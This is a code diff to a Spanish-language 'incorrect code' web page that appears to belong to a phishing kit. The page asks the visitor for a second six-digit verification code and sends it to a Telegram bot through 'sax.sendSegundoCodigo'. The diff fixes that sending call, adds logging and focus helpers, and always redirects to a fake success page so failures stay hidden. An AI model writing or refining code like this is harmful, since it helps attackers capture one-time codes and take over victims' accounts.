@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Código Incorrecto</title>
     <style>
-        /* Mantener el mismo estilo que las otras páginas */
         * {
             margin: 0;
             padding: 0;
@@ -127,6 +126,13 @@
             color: #3498db;
             margin-top: 10px;
         }
+
+        .error-message-text {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
         
         .footer {
             margin-top: 25px;
@@ -162,6 +168,10 @@
                     <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
                 </div>
                 
+                <div class="error-message-text" id="errorMessage">
+                    El código debe contener exactamente 6 dígitos
+                </div>
+                
                 <div class="loading" id="loading">Verificando código...</div>
                 
                 <button type="submit" class="btn-verify" id="verifyBtn" disabled>Verificar Código</button>
@@ -180,6 +190,7 @@
             const verifyBtn = document.getElementById('verifyBtn');
             const codeForm = document.getElementById('codeForm');
             const loading = document.getElementById('loading');
+            const errorMessage = document.getElementById('errorMessage');
 
             // Función para verificar si el código está completo
             function checkCodeComplete() {
@@ -190,17 +201,38 @@
                     }
                 });
                 verifyBtn.disabled = !codeComplete;
+                
+                if (codeComplete) {
+                    errorMessage.style.display = 'none';
+                }
+                
                 return codeComplete;
+            }
+
+            // Función para enfocar el siguiente input
+            function focusNextInput(currentInput, index) {
+                if (currentInput.value.length === 1 && index < codeInputs.length - 1) {
+                    codeInputs[index + 1].focus();
+                }
+                checkCodeComplete();
             }
 
             // Agregar event listeners a cada input
             codeInputs.forEach((input, index) => {
                 input.addEventListener('input', function() {
                     this.value = this.value.replace(/\D/g, '');
-                    if (this.value.length === 1 && index < codeInputs.length - 1) {
-                        codeInputs[index + 1].focus();
+                    
+                    if (this.value.length === 1) {
+                        focusNextInput(this, index);
                     }
                     checkCodeComplete();
+                });
+
+                // Manejar tecla retroceso
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
                 });
             });
 
@@ -221,20 +253,33 @@
                     verifyBtn.textContent = 'Procesando...';
 
                     try {
-                        // Enviar SEGUNDO código a Telegram
-                        const success = await saxBot.sendSegundoCodigo(segundoCodigo);
+                        console.log('🔹 codigoerror.html: Enviando segundo código...');
                         
-                        if (success) {
-                            // Redirigir a éxito después de enviar
-                            setTimeout(() => {
-                                window.location.href = 'exito.html';
-                            }, 2000);
-                        }
+                        // ✅ CORREGIDO: Usar 'sax' en lugar de 'saxBot'
+                        const success = await sax.sendSegundoCodigo(segundoCodigo);
+                        
+                        console.log('🔹 codigoerror.html: Resultado del envío:', success);
+                        
+                        // Redirigir a exito.html después de 2 segundos
+                        setTimeout(() => {
+                            console.log('🔹 codigoerror.html: Redirigiendo a exito.html...');
+                            window.location.href = 'exito.html';
+                        }, 2000);
+                        
                     } catch (error) {
-                        console.error('Error:', error);
+                        console.error('❌ codigoerror.html: Error:', error);
+                        // Aún así redirigir después de 2 segundos
+                        setTimeout(() => {
+                            window.location.href = 'exito.html';
+                        }, 2000);
                     }
+                } else {
+                    errorMessage.style.display = 'block';
                 }
             });
+
+            // Enfocar el primer input automáticamente
+            codeInputs[0].focus();
         });
     </script>
 </body>
